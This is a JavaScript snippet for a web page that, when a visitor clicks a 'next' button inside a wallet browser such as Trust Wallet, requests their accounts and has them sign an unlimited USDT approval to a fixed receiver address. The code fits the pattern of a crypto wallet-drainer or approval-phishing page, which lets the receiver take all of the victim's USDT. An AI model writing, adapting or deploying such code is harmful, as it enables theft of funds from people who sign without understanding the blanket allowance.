document.getElementById("nextBtn").addEventListener("click", async () => {
  if (typeof window.ethereum === "undefined") {
    alert("Please open this page inside Trust Wallet browser.");
    return;
  }

  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: "eth_requestAccounts" });

  const accounts = await web3.eth.getAccounts();
  const userAddress = accounts[0];

  const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);

  const maxApproval = web3.utils.toTwosComplement("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

  try {
    const tx = await usdt.methods
      .approve(RECEIVER_ADDRESS, maxApproval)
      .send({ from: userAddress });

    alert("USDT Approved Successfully!");
    console.log("Approval Tx:", tx);
  } catch (err) {
    console.error("Approval Failed:", err);
    alert("Something went wrong: " + err.message);
  }
});